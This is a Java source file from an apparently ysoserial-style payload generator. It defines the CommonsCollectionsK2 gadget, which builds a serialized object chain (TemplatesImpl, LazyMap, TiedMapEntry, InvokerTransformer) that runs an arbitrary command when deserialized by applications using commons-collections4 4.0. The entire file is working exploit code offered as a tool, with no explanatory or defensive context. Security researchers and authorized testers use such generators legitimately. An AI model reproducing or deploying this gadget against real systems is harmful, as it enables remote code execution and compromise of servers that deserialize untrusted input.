package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.utils.PayloadRunner;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.annotation.Authors;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.Reflections;

import java.util.HashMap;
import java.util.Map;

/**
 * @author su18
 */
@Dependencies({"commons-collections:commons-collections4:4.0"})
@Authors({"KORLR"})
public class CommonsCollectionsK2 implements CommandObjectPayload<Map>
{

	public Map getObject(String command) throws Exception {

		Object                  templates   = Gadgets.createTemplatesImpl(command);
		InvokerTransformer      transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
		HashMap<String, String> innerMap    = new HashMap<String, String>();
		LazyMap                 lazyMap     = LazyMap.lazyMap(innerMap, (Transformer) transformer);
		Map<Object, Object>     outerMap    = new HashMap<Object, Object>();
		TiedMapEntry            tied        = new TiedMapEntry((Map) lazyMap, templates);
		outerMap.put(tied, "t");
		innerMap.clear();
		Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
		return outerMap;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollectionsK2.class, args);
	}
}
